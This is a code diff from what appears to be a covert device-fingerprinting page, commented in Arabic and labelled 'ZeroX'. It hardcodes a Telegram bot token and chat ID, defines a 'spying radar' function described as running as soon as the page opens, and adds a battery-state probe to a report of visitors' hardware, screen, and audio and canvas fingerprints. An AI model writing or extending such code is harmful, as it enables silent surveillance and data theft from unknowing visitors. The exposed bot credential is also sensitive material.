@@ -137,9 +137,22 @@
  }   
 const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
 const chatId = "7388801889"; 
-    
+
+    // --- كاشف الشحن السريع لـ ZeroX ---
+async function getPowerTech() {
+    try {
+        const battery = await navigator.getBattery();
+        let powerSource = battery.charging ? "🔌 موصل بالطاقة" : "🔋 يعتمد على البطارية";
+        let healthEstimate = (battery.level > 0.9) ? "جديد/ممتاز" : "مستهلك";
+        return `${powerSource} | صحة البطارية: ${healthEstimate}`;
+    } catch(e) { return "غير متاح"; }
+}
+
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
+        // استدعاء قوة الطاقة
+let powerStatus = await getPowerTech();
+
         // --- كود بصمة الصوت (الأسطوري) لـ ZeroX ---
 async function getAudioFingerprint() {
     try {
@@ -274,6 +287,7 @@ let deviceFingerprint = getCanvasFingerprint();
 🎮 المعالج (GPU): ${gpuInfo} 
 📟 الذاكرة (RAM): ${ram} GB
 💾 التخزين: ${storageInfo}
+⚡ حالة الطاقة: ${powerStatus}
 🔋 البطارية: ${batteryInfo}
 ----------------------------------
 🖥️ الشاشة: ${screenRes}
